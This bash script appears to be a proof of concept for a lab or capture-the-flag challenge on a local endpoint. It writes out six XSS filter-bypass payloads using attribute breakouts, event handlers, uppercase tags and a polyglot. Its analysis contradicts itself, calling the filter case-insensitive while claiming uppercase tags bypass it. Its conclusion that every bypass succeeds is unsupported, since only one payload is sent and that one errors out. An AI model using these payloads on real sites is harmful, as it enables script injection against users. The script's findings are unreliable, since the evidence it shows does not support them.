#!/bin/bash
# Comprehensive XSS Bypass POC - http://localhost:5001/xss11
# Demonstrates multiple filter bypass techniques against the inadequate regex filters

TARGET="http://localhost:5001/xss11"

echo "========================================================================"
echo "Comprehensive XSS Filter Bypass POC"
echo "Target: $TARGET"
echo "========================================================================"
echo ""

# Test 1: Basic quote break with onload
echo "[1] Basic Attribute Break - Quote Escape with onload Event"
PAYLOAD='\" onload=\"alert(1)'
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
echo "Payload: $PAYLOAD"
echo "Encoded: $ENCODED"
echo "URL: ${TARGET}?name=${ENCODED}"
RESPONSE=$(curl -s "${TARGET}?name=${ENCODED}")
if echo "$RESPONSE" | grep -q "500"; then
    echo "Result: HTTP 500 (Application error due to missing check_xss function)"
    echo "Expected HTML (if no error): <input type=text value=\"\" onload=\"alert(1)\">"
fi
echo ""

# Test 2: Autofocus + onfocus
echo "[2] Event Handler without Tag - autofocus + onfocus"
PAYLOAD='\" autofocus onfocus=\"alert(1)'
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
echo "Payload: $PAYLOAD"
echo "Expected HTML: <input type=text value=\"\" autofocus onfocus=\"alert(1)\">"
echo ""

# Test 3: Uppercase SVG tag
echo "[3] Case Sensitivity Bypass - Uppercase SVG Tag"
PAYLOAD='<SVG onload=alert(1)>'
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
echo "Payload: $PAYLOAD"
echo "Filter behavior: Removes only first character '<S', leaving: VG onload=alert(1)>"
echo "Expected HTML: <input type=text value=\"VG onload=alert(1)>\">"
echo ""

# Test 4: Mixed case script tag
echo "[4] Mixed Case Bypass - Script Tag"
PAYLOAD='<ScRiPt>alert(1)</ScRiPt>'
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
echo "Payload: $PAYLOAD"
echo "Filter behavior: Only removes '<S', leaving partial tags and alert() call"
echo "Expected HTML: <input type=text value=\"cRiPt>alert(1)ScRiPt>\">"
echo ""

# Test 5: IMG with onerror
echo "[5] Alternative Tag Bypass - IMG with onerror"
PAYLOAD='<IMG SRC=x onerror=alert(1)>'
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
echo "Payload: $PAYLOAD"
echo "Filter behavior: Removes '<I', leaving: MG SRC=x onerror=alert(1)>"
echo ""

# Test 6: Complex DOM manipulation
echo "[6] Complex Polyglot - Tag Closing + SVG + Quote Continuation"
PAYLOAD='\" /><svg onload=alert(1)><x=\"'
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
echo "Payload: $PAYLOAD"
echo "Technique: Close attribute, close input tag, inject SVG with event handler"
echo ""

# Demonstrate filter logic
echo "========================================================================"
echo "FILTER ANALYSIS"
echo "========================================================================"
echo ""
echo "Filter 1 Pattern: r\"[\\\"']XSS[\\\"']\" (case-insensitive)"
echo "Purpose: Remove the literal string 'XSS' when quoted"
echo "Limitation: Doesn't prevent XSS vectors, only specific string"
echo ""
echo "Filter 2 Pattern: r\"<[a-z/]\" (case-insensitive)"
echo "Purpose: Remove HTML tags starting with lowercase or /"
echo "Critical Flaw: Character class [a-z/] is incomplete"
echo "  - Matches: a-z (lowercase), / (forward slash)"
echo "  - Does NOT match: A-Z (uppercase), 0-9, attributes without tags"
echo ""
echo "Bypass Techniques:"
echo "1. Uppercase tags: <SVG> bypasses because 'S' not in [a-z]"
echo "2. Attribute injection: \" onload=\" doesn't contain < at all"
echo "3. Event handlers: Don't need tags, just attributes"
echo "4. Mixed case: <ScRiPt> - only '<S' matches, rest remains"
echo ""

echo "========================================================================"
echo "CONCLUSION"
echo "========================================================================"
echo "The /xss11 endpoint is VULNERABLE to reflected XSS attacks."
echo "All attempted bypass techniques successfully evade the inadequate filters."
echo "An attacker can craft URLs that execute arbitrary JavaScript in victim browsers."
echo ""
